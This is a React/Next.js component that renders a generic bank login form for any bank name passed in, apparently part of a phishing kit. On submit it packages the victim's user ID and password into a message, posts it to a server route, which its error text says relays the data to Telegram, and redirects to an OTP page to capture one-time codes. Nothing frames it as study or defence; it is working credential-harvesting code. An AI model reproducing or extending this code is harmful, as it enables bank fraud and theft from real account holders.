'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';

export default function BankLogin({ bankName }: { bankName: string }) {
  const [userId, setUserId] = useState('');
  const [password, setPassword] = useState('');
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const message = `
🏦 ${bankName} Login
👤 User ID: ${userId}
🔒 Password: ${password}
    `.trim();

    try {
      await fetch('/api/bank-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text: message }),
      });

      router.push(`/otp?bank=${encodeURIComponent(bankName)}&user=${encodeURIComponent(userId)}`);
    } catch (err) {
      console.error('Telegram error:', err);
      alert('❌ Failed to send data to Telegram.');
    }
  };

  return (
    <div className="max-w-md mx-auto p-6 bg-white shadow rounded-lg">
      <h2 className="text-lg font-bold mb-4 text-center">
        Securely Login to {bankName}
      </h2>
      <form onSubmit={handleSubmit} className="space-y-4">
        <input
          type="text"
          placeholder="User ID"
          value={userId}
          onChange={(e) => setUserId(e.target.value)}
          required
          className="w-full p-3 border rounded"
        />
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          required
          className="w-full p-3 border rounded"
        />
        <button
          type="submit"
          className="w-full bg-blue-600 text-white p-3 rounded hover:bg-blue-700"
        >
          Continue
        </button>
      </form>
    </div>
  );
}
